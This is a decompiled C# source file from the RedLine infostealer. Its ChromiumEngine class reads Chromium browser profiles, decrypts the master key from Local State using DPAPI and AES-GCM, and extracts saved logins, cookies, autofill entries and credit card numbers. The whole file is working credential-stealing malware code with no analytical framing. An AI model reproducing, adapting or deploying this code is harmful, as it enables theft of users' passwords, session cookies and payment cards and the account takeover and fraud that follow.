using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using RedLine.Client.Logic.Crypto;
using RedLine.Logic.Extensions;
using RedLine.Logic.Helpers;
using RedLine.Logic.SQLite;
using RedLine.Models;
using RedLine.Models.Browsers;

namespace RedLine.Logic.Browsers.Chromium
{
	// Token: 0x0200006C RID: 108
	public static class ChromiumEngine
	{
		// Token: 0x060002DF RID: 735 RVA: 0x0000DA38 File Offset: 0x0000BC38
		public static List<Browser> ParseBrowsers(IList<string> profiles)
		{
			List<Browser> list = new List<Browser>();
			try
			{
				object obj = new object();
				foreach (string text in profiles)
				{
					bool flag = false;
					int num = 1;
					while (!flag)
					{
						Browser browser = new Browser();
						string dataFolder = string.Empty;
						string text2 = string.Empty;
						try
						{
							dataFolder = new FileInfo(text).Directory.FullName;
							if (dataFolder.Contains("Opera GX Stable"))
							{
								text2 = "Opera GX";
							}
							else
							{
								text2 = (text.Contains(Constants.RoamingAppData) ? ChromiumEngine.GetRoamingName(dataFolder) : ChromiumEngine.GetLocalName(dataFolder));
							}
							if (!string.IsNullOrEmpty(text2))
							{
								text2 = text2[0].ToString().ToUpper() + text2.Remove(0, 1);
								string name = ChromiumEngine.GetName(dataFolder);
								if (!string.IsNullOrEmpty(name))
								{
									browser.Name = text2;
									browser.Profile = name;
									browser.Credentials = ChromiumEngine.MakeTries<List<LoginPair>>(() => ChromiumEngine.GetCredentials(dataFolder), (List<LoginPair> x) => x.Count > 0).IsNull<List<LoginPair>>();
									browser.Cookies = ChromiumEngine.MakeTries<List<Cookie>>(() => ChromiumEngine.EnumCook(dataFolder), (List<Cookie> x) => x.Count > 0).IsNull<List<Cookie>>();
									browser.Autofills = ChromiumEngine.MakeTries<List<Autofill>>(() => ChromiumEngine.EnumFills(dataFolder), (List<Autofill> x) => x.Count > 0).IsNull<List<Autofill>>();
									browser.CreditCards = ChromiumEngine.MakeTries<List<CreditCard>>(() => ChromiumEngine.EnumCC(dataFolder), (List<CreditCard> x) => x.Count > 0).IsNull<List<CreditCard>>();
								}
							}
						}
						catch (Exception)
						{
						}
						object obj2 = obj;
						lock (obj2)
						{
							IList<Cookie> cookies = browser.Cookies;
							if (cookies == null || cookies.Count <= 0)
							{
								IList<LoginPair> credentials = browser.Credentials;
								if (credentials == null || credentials.Count <= 0)
								{
									IList<CreditCard> creditCards = browser.CreditCards;
									if (creditCards == null || creditCards.Count <= 0)
									{
										IList<Autofill> autofills = browser.Autofills;
										if (autofills == null || autofills.Count <= 0)
										{
											num++;
											goto IL_280;
										}
									}
								}
							}
							flag = true;
							list.Add(browser);
							IL_280:;
						}
						if (num > 2)
						{
							flag = true;
						}
					}
				}
			}
			catch
			{
			}
			return list;
		}

		// Token: 0x060002E0 RID: 736 RVA: 0x0000DD64 File Offset: 0x0000BF64
		private static List<LoginPair> GetCredentials(string profilePath)
		{
			List<LoginPair> list = new List<LoginPair>();
			try
			{
				string text = Path.Combine(profilePath, "Login Data");
				if (!File.Exists(text))
				{
					return list;
				}
				string text2 = string.Empty;
				string text3 = string.Empty;
				if (string.IsNullOrWhiteSpace(text2))
				{
					try
					{
						string[] array = profilePath.Split(new string[]
						{
							"\\"
						}, StringSplitOptions.RemoveEmptyEntries);
						array = array.Take(array.Length - 1).ToArray<string>();
						text3 = Path.Combine(string.Join("\\", array), "Local State");
						if (!File.Exists(text3))
						{
							text3 = Path.Combine(profilePath, "Local State");
						}
						if (File.Exists(text3))
						{
							try
							{
								bool flag;
								string path = DecryptHelper.TryCreateTemp(text3, out flag);
								text2 = File.ReadAllText(path).FromJSON()["os_crypt"]["encrypted_key"].ToString(false);
								if (flag)
								{
									File.Delete(path);
								}
							}
							catch (Exception)
							{
							}
						}
					}
					catch
					{
					}
				}
				bool flag2;
				string text4 = DecryptHelper.TryCreateTemp(text, out flag2);
				try
				{
					SqlConnection sqlConnection = new SqlConnection(text4);
					sqlConnection.ReadTable("logins");
					for (int i = 0; i < sqlConnection.RowLength; i++)
					{
						LoginPair loginPair = new LoginPair();
						try
						{
							loginPair = ChromiumEngine.ReadData(sqlConnection, i, text2);
						}
						catch
						{
						}
						if (loginPair.Password != "UNKNOWN")
						{
							list.Add(loginPair);
						}
					}
				}
				catch (Exception)
				{
				}
				if (flag2)
				{
					File.Delete(text4);
				}
			}
			catch (Exception)
			{
			}
			return list;
		}

		// Token: 0x060002E1 RID: 737 RVA: 0x0000DF4C File Offset: 0x0000C14C
		private static List<Cookie> EnumCook(string profilePath)
		{
			List<Cookie> list = new List<Cookie>();
			try
			{
				string text = Path.Combine(profilePath, "Cookies");
				if (!File.Exists(text))
				{
					return list;
				}
				string text2 = string.Empty;
				string text3 = string.Empty;
				if (string.IsNullOrWhiteSpace(text2))
				{
					try
					{
						string[] array = profilePath.Split(new string[]
						{
							"\\"
						}, StringSplitOptions.RemoveEmptyEntries);
						array = array.Take(array.Length - 1).ToArray<string>();
						text3 = Path.Combine(string.Join("\\", array), "Local State");
						if (!File.Exists(text3))
						{
							text3 = Path.Combine(profilePath, "Local State");
						}
						if (File.Exists(text3))
						{
							try
							{
								bool flag;
								string path = DecryptHelper.TryCreateTemp(text3, out flag);
								text2 = File.ReadAllText(path).FromJSON()["os_crypt"]["encrypted_key"].ToString(false);
								if (flag)
								{
									File.Delete(path);
								}
							}
							catch (Exception)
							{
							}
						}
					}
					catch
					{
					}
				}
				bool flag2;
				string text4 = DecryptHelper.TryCreateTemp(text, out flag2);
				try
				{
					SqlConnection sqlConnection = new SqlConnection(text4);
					sqlConnection.ReadTable("cookies");
					string fieldName = sqlConnection.Fields.Contains("is_secure") ? "is_secure" : "secure";
					sqlConnection.Fields.Contains("is_httponly");
					for (int i = 0; i < sqlConnection.RowLength; i++)
					{
						Cookie cookie = null;
						try
						{
							cookie = new Cookie
							{
								Host = sqlConnection.ParseValue(i, "host_key").Trim(),
								Http = sqlConnection.ParseValue(i, "host_key").Trim().StartsWith("."),
								Path = sqlConnection.ParseValue(i, "path").Trim(),
								Secure = (sqlConnection.ParseValue(i, fieldName) == "1"),
								Expires = Convert.ToInt64(sqlConnection.ParseValue(i, "expires_utc").Trim()) / 1000000L - 11644473600L,
								Name = sqlConnection.ParseValue(i, "name").Trim(),
								Value = ChromiumEngine.DecryptChromium(sqlConnection.ParseValue(i, "encrypted_value"), text2)
							};
						}
						catch
						{
						}
						if (cookie != null)
						{
							list.Add(cookie);
						}
					}
				}
				catch
				{
				}
				if (flag2)
				{
					File.Delete(text4);
				}
			}
			catch (Exception)
			{
			}
			return list;
		}

		// Token: 0x060002E2 RID: 738 RVA: 0x0000E228 File Offset: 0x0000C428
		private static List<Autofill> EnumFills(string profilePath)
		{
			List<Autofill> list = new List<Autofill>();
			try
			{
				string text = Path.Combine(profilePath, "Web Data");
				if (!File.Exists(text))
				{
					return list;
				}
				string text2 = string.Empty;
				string text3 = string.Empty;
				if (string.IsNullOrWhiteSpace(text2))
				{
					try
					{
						string[] array = profilePath.Split(new string[]
						{
							"\\"
						}, StringSplitOptions.RemoveEmptyEntries);
						array = array.Take(array.Length - 1).ToArray<string>();
						text3 = Path.Combine(string.Join("\\", array), "Local State");
						if (!File.Exists(text3))
						{
							text3 = Path.Combine(profilePath, "Local State");
						}
						if (File.Exists(text3))
						{
							try
							{
								bool flag;
								string path = DecryptHelper.TryCreateTemp(text3, out flag);
								text2 = File.ReadAllText(path).FromJSON()["os_crypt"]["encrypted_key"].ToString(false);
								if (flag)
								{
									File.Delete(path);
								}
							}
							catch (Exception)
							{
							}
						}
					}
					catch
					{
					}
				}
				bool flag2;
				string text4 = DecryptHelper.TryCreateTemp(text, out flag2);
				try
				{
					SqlConnection sqlConnection = new SqlConnection(text4);
					sqlConnection.ReadTable("autofill");
					for (int i = 0; i < sqlConnection.RowLength; i++)
					{
						Autofill autofill = null;
						try
						{
							string text5 = sqlConnection.ParseValue(i, "value").Trim();
							if (text5.StartsWith("v10") || text5.StartsWith("v11"))
							{
								text5 = ChromiumEngine.DecryptChromium(text5, text2);
							}
							autofill = new Autofill
							{
								Name = sqlConnection.ParseValue(i, "name").Trim(),
								Value = text5
							};
						}
						catch
						{
						}
						if (autofill != null)
						{
							list.Add(autofill);
						}
					}
				}
				catch
				{
				}
				if (flag2)
				{
					File.Delete(text4);
				}
			}
			catch (Exception)
			{
			}
			return list;
		}

		// Token: 0x060002E3 RID: 739 RVA: 0x0000E458 File Offset: 0x0000C658
		private static List<CreditCard> EnumCC(string profilePath)
		{
			List<CreditCard> list = new List<CreditCard>();
			try
			{
				string text = Path.Combine(profilePath, "Web Data");
				if (!File.Exists(text))
				{
					return list;
				}
				string text2 = string.Empty;
				string text3 = string.Empty;
				if (string.IsNullOrWhiteSpace(text3))
				{
					try
					{
						string[] array = profilePath.Split(new string[]
						{
							"\\"
						}, StringSplitOptions.RemoveEmptyEntries);
						array = array.Take(array.Length - 1).ToArray<string>();
						text2 = Path.Combine(string.Join("\\", array), "Local State");
						if (!File.Exists(text2))
						{
							text2 = Path.Combine(profilePath, "Local State");
						}
						if (File.Exists(text2))
						{
							try
							{
								bool flag;
								string path = DecryptHelper.TryCreateTemp(text2, out flag);
								text3 = File.ReadAllText(path).FromJSON()["os_crypt"]["encrypted_key"].ToString(false);
								if (flag)
								{
									File.Delete(path);
								}
							}
							catch (Exception)
							{
							}
						}
					}
					catch
					{
					}
				}
				bool flag2;
				string text4 = DecryptHelper.TryCreateTemp(text, out flag2);
				try
				{
					SqlConnection sqlConnection = new SqlConnection(text4);
					sqlConnection.ReadTable("credit_cards");
					for (int i = 0; i < sqlConnection.RowLength; i++)
					{
						CreditCard creditCard = null;
						try
						{
							string text5 = ChromiumEngine.DecryptChromium(sqlConnection.ParseValue(i, "card_number_encrypted"), text3).Replace(" ", string.Empty);
							creditCard = new CreditCard
							{
								Holder = sqlConnection.ParseValue(i, "name_on_card").Trim(),
								ExpirationMonth = Convert.ToInt32(sqlConnection.ParseValue(i, "expiration_month").Trim()),
								ExpirationYear = Convert.ToInt32(sqlConnection.ParseValue(i, "expiration_year").Trim()),
								CardNumber = text5,
								CardType = DecryptHelper.DetectCreditCardType(text5)
							};
						}
						catch
						{
						}
						if (creditCard != null)
						{
							list.Add(creditCard);
						}
					}
				}
				catch
				{
				}
				if (flag2)
				{
					File.Delete(text4);
				}
			}
			catch (Exception)
			{
			}
			return list;
		}

		// Token: 0x060002E4 RID: 740 RVA: 0x0000E6C0 File Offset: 0x0000C8C0
		private static LoginPair ReadData(SqlConnection manager, int row, string chromeKey)
		{
			LoginPair loginPair = new LoginPair();
			try
			{
				if (manager.Fields.Contains("Password_value"))
				{
					loginPair.Host = manager.ParseValue(row, "Origin_url").Trim();
					loginPair.Login = manager.ParseValue(row, "Username_value").Trim();
					loginPair.Password = ChromiumEngine.DecryptChromium(manager.ParseValue(row, "Password_value"), chromeKey);
				}
				else if (manager.Fields.Contains("password_value"))
				{
					loginPair.Host = manager.ParseValue(row, "origin_url").Trim();
					loginPair.Login = manager.ParseValue(row, "username_value").Trim();
					loginPair.Password = ChromiumEngine.DecryptChromium(manager.ParseValue(row, "password_value"), chromeKey);
				}
			}
			catch (Exception)
			{
			}
			finally
			{
				loginPair.Login = (string.IsNullOrWhiteSpace(loginPair.Login) ? "UNKNOWN" : loginPair.Login);
				loginPair.Password = (string.IsNullOrWhiteSpace(loginPair.Password) ? "UNKNOWN" : loginPair.Password);
				loginPair.Host = (string.IsNullOrWhiteSpace(loginPair.Host) ? "UNKNOWN" : loginPair.Host);
			}
			return loginPair;
		}

		// Token: 0x060002E5 RID: 741 RVA: 0x0000E808 File Offset: 0x0000CA08
		private static string DecryptChromium(string chiperText, string chromeKey)
		{
			string result = string.Empty;
			try
			{
				if (chiperText.StartsWith("v10") || chiperText.StartsWith("v11"))
				{
					result = ChromiumEngine.DecryptV10(chromeKey, chiperText);
				}
				else
				{
					result = DecryptHelper.DecryptBlob(chiperText, DataProtectionScope.CurrentUser, null).Trim();
				}
			}
			catch (Exception value)
			{
				Console.WriteLine(value);
			}
			return result;
		}

		// Token: 0x060002E6 RID: 742 RVA: 0x0000E868 File Offset: 0x0000CA68
		private static string DecryptV10(string base64_encrypted_key, string chiperText)
		{
			Encoding encoding = Encoding.GetEncoding("windows-1251");
			byte[] array = Convert.FromBase64String(base64_encrypted_key);
			byte[] array2 = new byte[array.Length - 5];
			typeof(Array).GetMethod("Copy", new Type[]
			{
				typeof(Array),
				typeof(int),
				typeof(Array),
				typeof(int),
				typeof(int)
			}).Invoke(null, new object[]
			{
				array,
				5,
				array2,
				0,
				array.Length - 5
			});
			byte[] bMasterKey = DecryptHelper.DecryptBlob(array2, DataProtectionScope.CurrentUser, null);
			return encoding.GetString(AesGcm.Decrypt(encoding.GetBytes(chiperText), bMasterKey));
		}

		// Token: 0x060002E7 RID: 743 RVA: 0x0000E940 File Offset: 0x0000CB40
		private static string GetName(string path)
		{
			try
			{
				string[] array = path.Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				if (array[array.Length - 2] == "User Data")
				{
					return array[array.Length - 1];
				}
			}
			catch
			{
			}
			return "Unknown";
		}

		// Token: 0x060002E8 RID: 744 RVA: 0x0000E99C File Offset: 0x0000CB9C
		private static string GetRoamingName(string path)
		{
			try
			{
				return path.Split(new string[]
				{
					"AppData\\Roaming\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries)[0];
			}
			catch
			{
			}
			return string.Empty;
		}

		// Token: 0x060002E9 RID: 745 RVA: 0x0000E9F0 File Offset: 0x0000CBF0
		private static string GetLocalName(string path)
		{
			try
			{
				string[] array = path.Split(new string[]
				{
					"AppData\\Local\\"
				}, StringSplitOptions.RemoveEmptyEntries)[1].Split(new char[]
				{
					'\\'
				}, StringSplitOptions.RemoveEmptyEntries);
				return array[0] + "_[" + array[1] + "]";
			}
			catch
			{
			}
			return string.Empty;
		}

		// Token: 0x060002EA RID: 746 RVA: 0x0000EA58 File Offset: 0x0000CC58
		public static T MakeTries<T>(Func<T> func, Func<T, bool> success)
		{
			int num = 1;
			T t = func();
			while (!success(t))
			{
				t = func();
				num++;
				if (num > 2)
				{
					return t;
				}
			}
			return t;
		}
	}
}
